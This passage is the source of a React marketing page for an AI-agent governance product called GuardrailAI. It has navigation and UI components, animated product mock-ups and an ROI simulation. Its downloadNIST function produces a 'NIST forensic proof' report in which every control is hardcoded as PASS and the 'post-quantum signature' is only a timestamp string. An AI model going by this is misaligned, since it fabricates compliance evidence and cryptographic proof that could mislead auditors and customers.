import React, { useState, useEffect } from 'react';
import {
    Eye, UserCheck, Activity, Lock, Shield, Zap, Target,
    Database, Command, Info, HelpCircle, X, ChevronRight,
    Cpu, BarChart3, Binary, LayoutDashboard, History,
    Files, ShieldAlert, Globe, Server, Beaker, Flame,
    UserCircle2, UserCog, Briefcase, Settings, Download,
    Share2, Repeat, Layers, Terminal, ArrowUpRight,
    AlertTriangle, Smartphone, LineChart, Code2, PlayCircle,
    ChevronDown, ChevronUp, CheckCircle2, Brain,
    Check, Plus, Workflow
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

/* --- NEW UI REFINEMENT COMPONENTS (Heuristic #2, #3, #5, #6) --- */

// Clinical Overlay (Business-Logic Translation)
export const ClinicalOverlay = ({ term, translation, children }: { term: string, translation: string, children: React.ReactNode }) => (
    <span className="has-clinical-overlay inline-block group border-b border-dotted border-emerald-500/50 cursor-help">
        {children}
        <div className="clinical-overlay">
            <div className="flex flex-col gap-2">
                <span className="text-[10px] font-black text-emerald-400 uppercase tracking-widest flex items-center gap-2">
                    <Info size={10} /> {term}
                </span>
                <span className="text-xs text-white/80 leading-relaxed font-medium italic">
                    &quot;{translation}&quot;
                </span>
            </div>
        </div>
    </span>
);

// Executive Subtitle
export const ExecutiveSubtitle = ({ text }: { text: string }) => (
    <span className="text-[11px] font-black uppercase text-emerald-400 opacity-60 tracking-[0.3em] block mt-1">
        &mdash; {text}
    </span>
);

// --- MOTION SYSTEM COMPONENTS ---

export const MotionReveal = ({ children, delay = 0 }: { children: React.ReactNode, delay?: number }) => (
    <motion.div
        initial={{ opacity: 0, y: 20 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true, margin: "-100px" }}
        transition={{ duration: 0.8, delay, ease: [0.3, 0, 0, 1] }}
    >
        {children}
    </motion.div>
);

// Persona Narrative (IDEO Lens)
export const PersonaNarrative = ({
    persona,
    content
}: {
    persona: 'operator' | 'auditor' | 'executive',
    content: { [key in 'operator' | 'auditor' | 'executive']: string }
}) => (
    <motion.div
        initial={{ opacity: 0, x: -10 }}
        animate={{ opacity: 1, x: 0 }}
        className="flex flex-col gap-2 py-4 border-l-2 border-emerald-500/20 pl-6 mb-8 group hover:border-emerald-500 transition-colors duration-500"
    >
        <div className="flex items-center gap-2 opacity-40 group-hover:opacity-100 transition-opacity">
            <UserCircle2 size={12} className="group-hover:text-emerald-400" />
            <span className="text-[9px] font-black uppercase tracking-widest">Targeted Orientation: {persona}</span>
        </div>
        <p className="text-sm opacity-80 leading-relaxed max-w-2xl italic group-hover:opacity-100 transition-opacity">
            &quot;{content[persona]}&quot;
        </p>
    </motion.div>
);

// Command Ingestor (CMD+K)
export const CommandIngestor = ({ isOpen, onClose, onNavigate }: { isOpen: boolean, onClose: () => void, onNavigate: (page: number) => void }) => {
    const [input, setInput] = useState('');
    const routes = [
        { cmd: 'HOME', page: 1, keywords: ['hero', 'start', 'logo'] },
        { cmd: 'ROI', page: 2, keywords: ['finance', 'savings', 'board'] },
        { cmd: 'LATTICE', page: 3, keywords: ['explorer', 'hash', 'proof'] },
        { cmd: 'OODA', page: 4, keywords: ['intercept', 'drift', 'vibe'] },
        { cmd: 'CRUCIBLE', page: 12, keywords: ['drill', 'drill', 'live', 'drill'] },
        { cmd: 'HERITAGE', page: 11, keywords: ['timeline', 'finality', 'history'] },
        { cmd: 'CERT', page: 13, keywords: ['judicial', 'export', 'proof'] },
    ];

    useEffect(() => {
        if (!isOpen) setInput('');
    }, [isOpen]);

    const handleKeyDown = (e: React.KeyboardEvent) => {
        if (e.key === 'Escape') onClose();
        if (e.key === 'Enter') {
            const match = routes.find(r => r.cmd.startsWith(input.toUpperCase()) || r.keywords.some(k => k.startsWith(input.toLowerCase())));
            if (match) {
                onNavigate(match.page);
                onClose();
            }
        }
    };

    if (!isOpen) return null;

    return (
        <div className="command-ingestor-backdrop animate-in fade-in duration-300" onClick={onClose}>
            <div className="w-full max-w-4xl flex flex-col gap-8" onClick={e => e.stopPropagation()}>
                <div className="flex items-center gap-6 text-emerald-400 opacity-40">
                    <Command size={48} />
                    <span className="text-xl font-black italic tracking-widest uppercase">Systemic Command Ingestor</span>
                </div>
                <input
                    autoFocus
                    className="command-ingestor-input"
                    placeholder="INGEST_COMMAND_HERE..."
                    value={input}
                    onChange={e => setInput(e.target.value)}
                    onKeyDown={handleKeyDown}
                />
                <div className="grid grid-cols-4 gap-4">
                    {routes.map(r => (
                        <div key={r.cmd} className="p-4 border border-white/10 glass-morphism opacity-40 hover:opacity-100 hover:border-emerald-500 transition-all cursor-pointer" onClick={() => { onNavigate(r.page); onClose(); }}>
                            <span className="text-[10px] font-black uppercase tracking-widest text-emerald-400">{r.cmd}</span>
                        </div>
                    ))}
                </div>
            </div>
        </div>
    );
};

export const SidebarNavItem = ({
    active,
    onClick,
    label,
    index,
    icon: Icon,
    href
}: {
    active: boolean,
    onClick?: () => void,
    label: string,
    index: string,
    icon: any,
    href?: string
}) => {
    const Component = href ? 'a' : 'button';
    return (
        <motion.div
            whileHover={{ x: 4 }}
            whileTap={{ scale: 0.98 }}
            className="w-full"
        >
            <Component
                onClick={onClick}
                href={href}
                className={`sidebar-nav-item ${active ? 'active' : ''} flex items-center gap-3 w-full group overflow-hidden relative`}
            >
                <span className="opacity-30 font-mono text-[8px] group-hover:opacity-100 transition-opacity">{index}</span>
                <Icon size={14} strokeWidth={1.5} className={active ? 'text-emerald-400' : 'opacity-40 group-hover:opacity-100 group-hover:text-emerald-400/50 transition-all'} />
                <span className="flex-1 text-left">{label}</span>
                {active && (
                    <motion.div
                        layoutId="active-indicator"
                        className="w-1 h-4 bg-emerald-400 rounded-full"
                        transition={{ type: "spring", stiffness: 300, damping: 30 }}
                    />
                )}
                <div className="absolute inset-0 bg-emerald-500/0 group-hover:bg-emerald-500/5 transition-colors pointer-events-none" />
            </Component>
        </motion.div>
    );
};

export const PersonaSelector = ({
    current,
    onSelect
}: {
    current: 'operator' | 'auditor' | 'executive',
    onSelect: (p: 'operator' | 'auditor' | 'executive') => void
}) => {
    const personas = [
        { id: 'operator', icon: UserCog, label: 'Operator', color: 'engineer' },
        { id: 'auditor', icon: Briefcase, label: 'Auditor', color: 'auditor' },
        { id: 'executive', icon: UserCircle2, label: 'Executive', color: 'executive' }
    ];

    return (
        <div className="flex flex-col gap-2 p-4 glass-morphism border-white/5 mb-8 relative">
            <span className="text-[8px] font-black uppercase opacity-30 tracking-widest pl-2 mb-1">Security Persona Context</span>
            <div className="flex gap-1">
                {personas.map(p => (
                    <button
                        key={p.id}
                        onClick={() => onSelect(p.id as any)}
                        className={`flex-1 flex flex-col items-center gap-1 py-2 transition-all rounded relative group ${current === p.id ? 'bg-white/10 opacity-100' : 'opacity-20 hover:opacity-40'}`}
                        title={p.label}
                    >
                        <p.icon size={12} strokeWidth={1.5} className={current === p.id ? 'text-emerald-400' : 'group-hover:text-emerald-400/50'} />
                        <span className={`persona-tag ${p.color}`}>{p.id[0]}</span>
                        {current === p.id && (
                            <motion.div
                                layoutId="persona-active"
                                className="absolute inset-0 border border-emerald-500/30 rounded"
                                transition={{ type: "spring", stiffness: 300, damping: 30 }}
                            />
                        )}
                    </button>
                ))}
            </div>
        </div>
    );
};

export const SovereignSidebar = ({
    currentPage,
    onNavigate,
    persona,
    onPersonaChange,
    status = 'normal'
}: {
    currentPage: number,
    onNavigate: (p: number) => void,
    persona: 'operator' | 'auditor' | 'executive',
    onPersonaChange: (p: 'operator' | 'auditor' | 'executive') => void,
    status?: 'normal' | 'breach'
}) => {
    const navItems = [
        { id: 1, label: 'Absolute Trust', icon: Shield, href: '/' },
        { id: 2, label: 'ROI Reflex', icon: BarChart3, href: '/governance' },
        { id: 3, label: 'Institutional Finality', icon: Lock, href: '/governance' },
        { id: 4, label: 'Heritage', icon: History, href: '/' },
        { id: 5, label: 'War-Room', icon: Flame, href: '/governance' },
        { id: 6, label: 'Liaison', icon: Globe, href: '/' },
        { id: 7, label: 'Judicial', icon: Files, href: '/' },
        { id: 8, label: 'Stewardship', icon: UserCheck, href: '/' },
        { id: 11, label: 'Registry', icon: Database, href: '/platform' },
        { id: 12, label: 'Sandbox', icon: Beaker, href: '/governance' },
        { id: 13, label: 'Crucible', icon: Zap, href: '/governance' }
    ];

    return (
        <aside className="main-sidebar">
            <div className="flex flex-col h-full">
                <div className="mb-12 cursor-pointer flex items-center gap-3 group" onClick={() => onNavigate(1)}>
                    <div className="w-10 h-10 border border-emerald-500/50 flex items-center justify-center relative overflow-hidden">
                        <div className={`absolute inset-0 bg-emerald-500/10 ${status === 'breach' ? 'bg-red-500/20' : ''} animate-pulse`} />
                        <Shield size={20} className={status === 'breach' ? 'text-red-500' : 'text-emerald-400'} />
                    </div>
                    <div className="flex flex-col">
                        <span className="text-xs font-black italic italic tracking-tighter">GUARDRAIL</span>
                        <span className="text-[7px] font-black uppercase opacity-40 tracking-[0.3em] -mt-1">Sovereign Mesh</span>
                    </div>
                </div>

                <PersonaSelector current={persona} onSelect={onPersonaChange} />

                <div className="flex-1 flex flex-col gap-1 overflow-y-auto pr-2 custom-scrollbar">
                    {navItems.map(item => (
                        <SidebarNavItem
                            key={item.id}
                            active={currentPage === item.id}
                            index={item.id.toString().padStart(2, '0')}
                            label={item.label}
                            icon={item.icon}
                            href={item.href}
                            onClick={item.href ? undefined : () => onNavigate(item.id)}
                        />
                    ))}
                </div>

                <div className="mt-8 pt-8 border-t border-white/5 flex flex-col gap-4">
                    <div className="flex flex-col gap-1">
                        <span className="text-[8px] font-black uppercase opacity-30 tracking-widest pl-2">System Health</span>
                        <div className="flex items-center gap-2 px-2">
                            <div className={`w-1 h-1 rounded-full ${status === 'breach' ? 'bg-red-500 shadow-[0_0_5px_red]' : 'bg-emerald-400 shadow-[0_0_5px_#00ff88]'} animate-pulse`} />
                            <span className="text-[7px] font-black uppercase opacity-60 tracking-wider">
                                {status === 'breach' ? 'VETO_SEQUENCE_ACTIVE' : 'SIGNAL_STABLE_MUMBAI'}
                            </span>
                        </div>
                    </div>

                    <div className="flex flex-col gap-2 p-3 bg-white/5 rounded border border-white/5">
                        <div className="flex justify-between items-center text-[7px] font-black opacity-40 uppercase">
                            <span>Auth Level</span>
                            <span>Quantum-Root</span>
                        </div>
                        <div className="h-[2px] w-full bg-white/10 overflow-hidden">
                            <motion.div
                                initial={{ x: '-100%' }}
                                animate={{ x: '100%' }}
                                transition={{ repeat: Infinity, duration: 3, ease: 'linear' }}
                                className="h-full w-1/2 bg-emerald-500/50"
                            />
                        </div>
                    </div>
                </div>
            </div>
        </aside>
    );
};

// ... existing guide and overlay components ...
export const StewardsGuide = ({ onDismiss }: { onDismiss: () => void }) => {
    return (
        <div className="stewards-guide-card animate-in slide-in-from-left-12 duration-700">
            <button onClick={onDismiss} className="absolute top-4 right-4 text-white/40 hover:text-red-500 transition-colors">
                <X size={16} />
            </button>
            <div className="flex flex-col gap-6">
                <div className="flex items-center gap-4 text-emerald-400">
                    <HelpCircle size={24} />
                    <h4 className="text-sm font-black uppercase tracking-widest">Steward&apos;s Orientation</h4>
                </div>
                <div className="flex flex-col gap-4 text-[11px] leading-relaxed opacity-80">
                    <div className="flex gap-4">
                        <div className="w-2 h-2 rounded-full bg-emerald-400 mt-1 shrink-0" />
                        <p><span className="text-emerald-400 font-black">EMERALD:</span> Sovereign signal mesh is healthy and intent-aligned.</p>
                    </div>
                    <div className="flex gap-4">
                        <div className="w-2 h-2 rounded-full bg-amber-400 mt-1 shrink-0" />
                        <p><span className="text-amber-400 font-black">AMBER:</span> Agitation detected. Systemic drift within tolerance.</p>
                    </div>
                    <div className="flex gap-4">
                        <div className="w-2 h-2 rounded-full bg-red-500 mt-1 shrink-0" />
                        <p><span className="text-red-500 font-black">RED:</span> ABSOLUTE VETO. Hard block triggered by Trinity Consensus.</p>
                    </div>
                </div>
                <button onClick={onDismiss} className="w-full py-3 bg-white text-black font-black uppercase text-[10px] tracking-widest hover:bg-emerald-400 transition-all">
                    ACKNOWLEDGE STEWARDSHIP
                </button>
            </div>
        </div>
    );
};

/* --- EXISTING COMPONENTS --- */
// Ecosystem Integrations (Frog Lens)
// Product In Context (Work & Co Lens)
export const ProductInContext = () => {
    const screens = [
        { id: 'vscode', label: 'VS Code Extension', icon: Cpu, color: 'text-blue-400' },
        { id: 'jupyter', label: 'Jupyter Plugin', icon: Binary, color: 'text-orange-400' },
        { id: 'terminal', label: 'CLI / Terminal', icon: Command, color: 'text-emerald-400' },
    ];

    const [activeScreen, setActiveScreen] = useState('vscode');

    return (
        <section className="py-24 border-y border-white/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 max-w-4xl mb-12">
                    <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                        PRODUCT-IN-CONTEXT
                        <ExecutiveSubtitle text="Transparent integration into existing development velocity." />
                    </h2>
                    <p className="text-xl opacity-70 leading-relaxed font-medium italic">
                        GuardrailAI isn&apos;t just a dashboard—it&apos;s a systemic layer that lives where your engineers build.
                    </p>
                </div>
            </MotionReveal>

            <div className="grid lg:grid-cols-4 gap-8">
                <div className="flex flex-col gap-2">
                    {screens.map((s, i) => (
                        <motion.button
                            key={s.id}
                            initial={{ opacity: 0, x: -20 }}
                            whileInView={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.1, duration: 0.5 }}
                            whileHover={{ x: 6, backgroundColor: "rgba(16, 185, 129, 0.05)" }}
                            whileTap={{ scale: 0.98 }}
                            viewport={{ once: true }}
                            onClick={() => setActiveScreen(s.id)}
                            className={`flex items-center gap-4 p-6 glass-morphism border-white/5 text-left transition-all ${activeScreen === s.id ? 'border-emerald-500 bg-emerald-500/5' : 'opacity-40 hover:opacity-100'}`}
                        >
                            <s.icon size={20} className={activeScreen === s.id ? s.color : 'text-white/40 group-hover:text-white transition-colors'} />
                            <span className="text-[10px] font-black uppercase tracking-widest">{s.label}</span>
                        </motion.button>
                    ))}
                </div>

                <motion.div
                    initial={{ opacity: 0, scale: 0.98 }}
                    whileInView={{ opacity: 1, scale: 1 }}
                    transition={{ duration: 0.8 }}
                    viewport={{ once: true }}
                    className="lg:col-span-3 h-[500px] glass-morphism brutalist-border p-8 relative overflow-hidden bg-[#0a0a0a]"
                >
                    <AnimatePresence mode="wait">
                        {activeScreen === 'vscode' && (
                            <motion.div
                                key="vscode"
                                initial={{ opacity: 0, y: 30 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -30 }}
                                transition={{ type: "spring", damping: 20, stiffness: 100 }}
                                className="flex flex-col h-full gap-4 font-mono text-xs"
                            >
                                <div className="flex items-center gap-2 border-b border-white/10 pb-4 opacity-40">
                                    <div className="w-2 h-2 rounded-full bg-red-500" />
                                    <div className="w-2 h-2 rounded-full bg-amber-500" />
                                    <div className="w-2 h-2 rounded-full bg-emerald-500" />
                                    <span className="ml-4 uppercase tracking-tighter">governance_main.py — Guardrail Editor</span>
                                </div>
                                <div className="flex-1 overflow-hidden opacity-80">
                                    <p className="text-blue-300">import <span className="text-white">guardrail</span></p>
                                    <p className="text-gray-500 mt-2"># Observe intent from untrusted agent</p>
                                    <p className="text-purple-400">@guardrail.intercept<span className="text-white">(strict_mode=True)</span></p>
                                    <p className="text-blue-300">async def <span className="text-yellow-200">execute_treasury_transfer</span><span className="text-white">(amount):</span></p>
                                    <div className="ml-4 border-l border-white/10 pl-4 mt-2">
                                        <p className="text-emerald-400 bg-emerald-500/10 px-2 my-1 border-l-2 border-emerald-500 animate-pulse">
                                            [GUARDRAIL] Observing: Multi-sig bypass attempt detected.
                                        </p>
                                        <p className="text-white">pass</p>
                                    </div>
                                </div>
                                <div className="mt-auto p-4 bg-emerald-500/10 border-t-2 border-emerald-500 flex items-center justify-between">
                                    <div className="flex items-center gap-4">
                                        <Shield size={16} className="text-emerald-400" />
                                        <span className="text-[10px] font-black uppercase text-emerald-400 tracking-widest">Sovereign Protection Active</span>
                                    </div>
                                    <span className="opacity-40 text-[9px]">Latency: 0.8ms</span>
                                </div>
                            </motion.div>
                        )}

                        {activeScreen === 'jupyter' && (
                            <motion.div
                                key="jupyter"
                                initial={{ opacity: 0, scale: 0.95 }}
                                animate={{ opacity: 1, scale: 1 }}
                                exit={{ opacity: 0, scale: 1.05 }}
                                transition={{ duration: 0.5 }}
                                className="flex flex-col h-full gap-8"
                            >
                                <div className="p-6 bg-white/5 border border-white/10 rounded flex flex-col gap-4">
                                    <span className="text-[10px] font-black opacity-30 tracking-widest">[IN 42]</span>
                                    <code className="text-emerald-400">crucible.run_drill(&quot;multi_agent_cartel&quot;, intensity=0.98)</code>
                                </div>
                                <div className="p-6 bg-black border border-white/10 rounded flex flex-col gap-4 h-full relative overflow-hidden">
                                    <span className="text-[10px] font-black opacity-30 tracking-widest">[OUT 42]</span>
                                    <div className="flex flex-col gap-2">
                                        <p className="text-emerald-400 font-black tracking-widest text-[10px]">VERIFYING_CONSENSUS...</p>
                                        <p className="text-xs opacity-60">Trinity Audit successful. 3/3 agents vetoed adversarial intent.</p>
                                    </div>
                                    <div className="h-2 bg-emerald-500/20 rounded-full overflow-hidden mt-4">
                                        <motion.div
                                            animate={{ x: ['-100%', '100%'] }}
                                            transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
                                            className="h-full w-24 bg-emerald-400"
                                        />
                                    </div>
                                </div>
                            </motion.div>
                        )}

                        {activeScreen === 'terminal' && (
                            <motion.div
                                key="terminal"
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                transition={{ type: "spring", damping: 25 }}
                                className="flex flex-col h-full font-mono text-sm gap-2"
                            >
                                <p className="text-emerald-400">$ guardrail certify --last-veto</p>
                                <p className="opacity-40">Analyzing judicial record 0x8a72...f9e2</p>
                                <p className="text-emerald-400 mt-4">--- JUDICIAL CERTIFICATE GENERATED ---</p>
                                <p className="opacity-60">ID: CERT-2026-X991</p>
                                <p className="opacity-60">Outcome: HARD_VETO</p>
                                <p className="opacity-60">Liability Prevented: $1.2M</p>
                                <p className="text-amber-400 mt-8">Warning: Drift threshold reached in Frankfurt cluster.</p>
                                <motion.span
                                    animate={{ opacity: [0, 1] }}
                                    transition={{ repeat: Infinity, duration: 0.8 }}
                                    className="w-2 h-5 bg-emerald-400 inline-block"
                                />
                            </motion.div>
                        )}
                    </AnimatePresence>
                </motion.div>
            </div>
        </section>
    );
};

export const EcosystemIntegrations = () => {
    const nodes = [
        { id: 'aws', label: 'AWS S3/RDS', x: 10, y: 20, type: 'source', icon: Database },
        { id: 'gcp', label: 'GCP BigQuery', x: 10, y: 50, type: 'source', icon: Cpu },
        { id: 'azure', label: 'Azure Blob', x: 10, y: 80, type: 'source', icon: Layers },
        { id: 'guardrail', label: 'GUARDRAIL.AI', x: 50, y: 50, type: 'core', icon: Shield },
        { id: 'openai', label: 'OpenAI GPT-4', x: 90, y: 20, type: 'target', icon: Brain },
        { id: 'anthropic', label: 'Claude 3.5', x: 90, y: 50, type: 'target', icon: Zap },
        { id: 'meta', label: 'Llama 3.1', x: 90, y: 80, type: 'target', icon: Binary },
    ];

    const connections = [
        { from: 'aws', to: 'guardrail' },
        { from: 'gcp', to: 'guardrail' },
        { from: 'azure', to: 'guardrail' },
        { from: 'guardrail', to: 'openai' },
        { from: 'guardrail', to: 'anthropic' },
        { from: 'guardrail', to: 'meta' },
    ];

    return (
        <MotionReveal>
            <div className="flex flex-col gap-8 glass-morphism brutalist-border p-12 relative overflow-hidden group hover:border-emerald-500/30 transition-all duration-700">
                <div className="flex flex-col gap-2 relative z-10 transition-transform duration-500 group-hover:translate-x-2">
                    <h3 className="text-2xl font-black italic uppercase text-emerald-400">Systemic Integration Lattice</h3>
                    <ExecutiveSubtitle text="Autonomous ingestion and post-quantum verification mesh." />
                </div>

                <div className="h-[400px] relative mt-12">
                    <svg className="absolute inset-0 w-full h-full pointer-events-none">
                        {connections.map((conn, i) => {
                            const from = nodes.find(n => n.id === conn.from)!;
                            const to = nodes.find(n => n.id === conn.to)!;
                            return (
                                <motion.line
                                    key={i}
                                    x1={`${from.x}%`}
                                    y1={`${from.y}%`}
                                    x2={`${to.x}%`}
                                    y2={`${to.y}%`}
                                    stroke="rgba(0, 255, 136, 0.15)"
                                    strokeWidth="1"
                                    initial={{ pathLength: 0, opacity: 0 }}
                                    whileInView={{ pathLength: 1, opacity: 1 }}
                                    transition={{ duration: 2, delay: i * 0.15, ease: "easeInOut" }}
                                    viewport={{ once: true }}
                                />
                            );
                        })}
                    </svg>

                    {nodes.map((node, i) => (
                        <motion.div
                            key={node.id}
                            initial={{ scale: 0, opacity: 0 }}
                            whileInView={{ scale: 1, opacity: 1 }}
                            transition={{
                                type: "spring",
                                stiffness: 260,
                                damping: 20,
                                delay: i * 0.05
                            }}
                            whileHover={{
                                scale: 1.1,
                                zIndex: 20,
                                backgroundColor: "rgba(16, 185, 129, 0.1)"
                            }}
                            viewport={{ once: true }}
                            className={`absolute -translate-x-1/2 -translate-y-1/2 p-4 glass-morphism border-emerald-500/20 flex flex-col items-center gap-2 cursor-pointer z-10 transition-all ${node.type === 'core' ? 'border-2 border-emerald-500 shadow-[0_0_20px_rgba(0,255,136,0.2)]' : ''}`}
                            style={{ left: `${node.x}%`, top: `${node.y}%` }}
                        >
                            {node.icon && <node.icon size={16} className={node.type === 'core' ? 'text-emerald-400' : 'text-white/40 group-hover:text-emerald-400/50 transition-colors'} />}
                            <span className="text-[9px] font-black uppercase tracking-widest whitespace-nowrap">{node.label}</span>
                            {node.type === 'core' && (
                                <div className="flex gap-1 mt-1">
                                    <div className="w-1 h-1 bg-emerald-400 rounded-full animate-ping" />
                                    <div className="w-1 h-1 bg-emerald-400 rounded-full animate-ping delay-75" />
                                    <div className="w-1 h-1 bg-emerald-400 rounded-full animate-ping delay-150" />
                                </div>
                            )}
                        </motion.div>
                    ))}
                </div>

                <div className="absolute -bottom-24 -right-24 w-64 h-64 bg-emerald-500/5 blur-[100px] rounded-full group-hover:bg-emerald-500/10 transition-colors duration-1000" />
            </div>
        </MotionReveal>
    );
};

export const SovereignSignalLogo = ({ status = 'normal' }: { status?: 'normal' | 'breach' }) => {
    const isBreach = status === 'breach';
    const color = isBreach ? '#ff004c' : '#00ff88';
    const bloomClass = isBreach ? 'signal-red' : 'signal-emerald';

    return (
        <motion.div
            whileHover={{ scale: 1.05 }}
            className="flex items-center gap-8 group cursor-pointer"
        >
            <div className="relative">
                <div className="absolute inset-0 bg-white/5 blur-3xl rounded-full group-hover:bg-emerald-500/10 transition-colors duration-1000" />
                <svg width="80" height="80" viewBox="0 0 100 100" className="relative z-10 drop-shadow-[0_0_15px_rgba(255,255,255,0.1)]">
                    <motion.path
                        initial={false}
                        animate={{ stroke: isBreach ? '#ff004c' : 'white' }}
                        d="M25 10 L8 10 L8 90 L25 90 M75 10 L92 10 L92 90 L75 90"
                        fill="none"
                        stroke="white"
                        strokeWidth="6"
                        className="transition-all duration-700 group-hover:stroke-emerald-400 group-hover:stroke-[8px]"
                    />
                    <path
                        d="M35 20 L65 20 M35 80 L65 80"
                        fill="none"
                        stroke="white"
                        strokeWidth="2"
                        strokeOpacity="0.3"
                    />
                    <g className={bloomClass}>
                        <circle cx="50" cy="50" r="16" fill={color} />
                        <circle cx="50" cy="50" r="28" stroke={color} strokeWidth="1" fill="none" className="opacity-20 animate-ping" />
                        <circle cx="50" cy="50" r="35" stroke={color} strokeWidth="0.5" fill="none" className="opacity-10 animate-[ping_3s_linear_infinite]" />
                    </g>
                </svg>
                <div className="absolute inset-[-10px] border border-white/5 rounded-full animate-[spin_15s_linear_infinite]" />
                <div className="absolute inset-[-20px] border border-white/5 rounded-full animate-[spin_25s_linear_reverse_infinite]" />
            </div>
            <div className="flex flex-col gap-1">
                <span className="text-3xl font-black italic tracking-tighter leading-none tracking-[-0.05em] group-hover:text-emerald-400 transition-colors">GUARDRAIL.AI</span>
                <div className="flex items-center gap-2">
                    <div className={`w-1.5 h-1.5 rounded-full ${isBreach ? 'bg-red-500 shadow-[0_0_8px_#ff004c]' : 'bg-emerald-400 shadow-[0_0_8px_#00ff88]'} animate-pulse`} />
                    <span className={`text-[9px] font-black uppercase tracking-[0.4em] transition-all ${isBreach ? 'text-red-500' : 'text-emerald-400 opacity-70 group-hover:opacity-100'}`}>
                        {isBreach ? 'VETO_ACTIVE_MUMBAI' : 'GLOBAL_SIGNAL_MESH_ACTIVE'}
                    </span>
                </div>
            </div>
        </motion.div>
    );
};

// 2. Kinetic Typography Component
export const KineticTitle = ({ text }: { text: string }) => {
    return (
        <h1 className="text-5xl md:text-7xl font-black italic leading-[0.9] kinetic-text select-none">
            {text}
        </h1>
    );
};

// 3. Hero Metric Display
export const HeroMetric = ({ label, value }: { label: string, value: string }) => {
    return (
        <motion.div
            initial={{ opacity: 0, x: -20 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 1 }}
            className="flex flex-col gap-1 border-l-2 border-neon-blue pl-6 py-2"
        >
            <span className="text-3xl font-black italic text-neon-blue tracking-tighter">{value}</span>
            <span className="text-[10px] font-bold uppercase opacity-50 tracking-[0.25em]">{label}</span>
        </motion.div>
    );
};

// 4. Hero Section Component (C-Suite Refinement)
export const HeroSection = ({ onToggleBreach }: { onToggleBreach: () => void }) => {
    const [roiModal, setRoiModal] = useState(false);
    const [vetoModal, setVetoModal] = useState(false);
    const [roiStep, setRoiStep] = useState(0);
    const [vetoStep, setVetoStep] = useState(-1);

    // ROI Simulation steps (enterprise parameters)
    const roiParams = [
        { label: 'Avg. Agentic Transactions / Day', value: '12,400', unit: 'txn' },
        { label: 'CD-24 Liability Buffer Applied', value: '$14.8M', unit: 'USD' },
        { label: 'Annual Risk Exposure (no guard)', value: '$73.2M', unit: 'estimated' },
        { label: 'Guardrail Annual Cost', value: '$420K', unit: 'SaaS' },
        { label: 'Net Annual Savings', value: '$72.78M', unit: 'ROI' },
        { label: 'Payback Period', value: '< 48 hours', unit: '' },
        { label: 'Regulatory Fine Immunity (EU AI Act)', value: '€4.2M', unit: 'neutralised' },
    ];

    // Veto Pulse OODA simulation stages
    const vetoStages = [
        { phase: 'OBSERVE', ms: '0.4ms', color: 'text-white', desc: 'Agent emits tool-call: transfer_funds($4.2M, offshore_acct)' },
        { phase: 'ORIENT', ms: '0.8ms', color: 'text-amber-400', desc: 'Semantic drift detected: ASI06 — Covert Intent Misalignment' },
        { phase: 'DECIDE', ms: '1.2ms', color: 'text-orange-400', desc: 'Trinity Consensus: Gemini=VETO, Llama=VETO, Claude=VETO (3-of-3)' },
        { phase: 'ACT', ms: '1.6ms', color: 'text-emerald-400', desc: 'Hard block issued. Circuit breaker tripped. JUD-CERT queued.' },
        { phase: 'FINALISE', ms: '2.1ms', color: 'text-emerald-400', desc: 'Constitutional hash updated. Board alert dispatched. Liability: $0.' },
    ];

    const runROI = () => {
        setRoiModal(true);
        setRoiStep(0);
        let step = 0;
        const iv = setInterval(() => {
            step++;
            setRoiStep(step);
            if (step >= roiParams.length) clearInterval(iv);
        }, 500);
    };

    const runVeto = () => {
        setVetoModal(true);
        setVetoStep(0);
        onToggleBreach(); // also trigger the breach LED
        let step = 0;
        const iv = setInterval(() => {
            step++;
            setVetoStep(step);
            if (step >= vetoStages.length) {
                clearInterval(iv);
                setTimeout(() => onToggleBreach(), 1200); // reset breach LED after animation
            }
        }, 700);
    };

    const downloadNIST = () => {
        const report = {
            document: 'NIST AI RMF — Guardrail.ai Forensic Proof Package',
            generated: new Date().toISOString(),
            framework: 'NIST AI Risk Management Framework (AI RMF) 1.0',
            certification: 'JUD-A01 · Sovereign Audit Chain',
            controls: [
                { id: 'GOVERN-1.1', status: 'PASS', evidence: 'Sovereign Constitution — EFI-locked, SPHINCS+-signed' },
                { id: 'MAP-1.5', status: 'PASS', evidence: 'Real-time agent intent classification via Trinity veto protocol' },
                { id: 'MEASURE-2.5', status: 'PASS', evidence: 'OODA latency P99: 2.1ms · 100% intercept rate (CD-24)' },
                { id: 'MANAGE-1.3', status: 'PASS', evidence: '$14.8M liability buffer — Chaos Drill 24 validated' },
                { id: 'MANAGE-4.1', status: 'PASS', evidence: 'WORM archive — 12-month immutable log, SHA3-PQC signed' },
                { id: 'GOVERN-6.2', status: 'PASS', evidence: '2-Natural-Person liveness — Level 0 constitutional amendments' },
            ],
            pqcSignature: 'SPHINCS+::ROOT::' + Date.now().toString(16).toUpperCase() + '::WORM-ANCHORED',
            liability: { cd24_drill: '$10B', actual_loss: '$0', latency: '0.004s' },
        };
        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'Guardrail_NIST_Forensic_Proof_' + new Date().toISOString().slice(0, 10) + '.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    return (
        <>
            <section className="min-h-[85vh] flex flex-col justify-center gap-16 relative">
                <div className="flex flex-col gap-10 max-w-5xl">
                    <MotionReveal>
                        <div className="flex items-center gap-3 mb-2">
                            <div className="h-[1px] w-12 bg-emerald-500/50" />
                            <span className="text-[10px] font-black uppercase tracking-[0.4em] text-emerald-400">
                                ONE OF ITS KIND | SOVEREIGN GOVERNANCE
                            </span>
                        </div>
                        <KineticTitle text="SOVEREIGN GOVERNANCE FOR THE AUTONOMOUS ENTERPRISE." />
                    </MotionReveal>

                    <MotionReveal delay={0.2}>
                        <p className="text-2xl opacity-80 font-medium leading-relaxed max-w-4xl border-l-2 border-white/20 pl-8">
                            Move from <span className="text-white italic">&quot;AI Experiments&quot;</span> to <span className="text-emerald-400">&quot;Sovereign Production&quot;</span> with
